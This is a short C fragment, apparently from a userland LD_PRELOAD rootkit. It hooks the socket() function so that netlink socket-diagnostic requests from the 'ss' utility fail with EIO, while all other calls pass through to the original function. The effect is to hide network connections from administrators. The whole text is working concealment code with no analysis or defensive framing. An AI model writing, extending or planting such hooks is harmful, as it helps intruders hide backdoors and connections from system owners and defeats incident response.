int socket(int domain, int type, int protocol)
{
    if(domain == AF_NETLINK && protocol == NETLINK_INET_DIAG &&
      (!strcmp(cprocname(), "ss") ||
      !strcmp(cprocname(), "/usr/sbin/ss") ||
      !strcmp(cprocname(), "/bin/ss")))
      { errno = EIO; return -1; }
    HOOK(o_socket, CSOCKET);
    return o_socket(domain,type,protocol);
}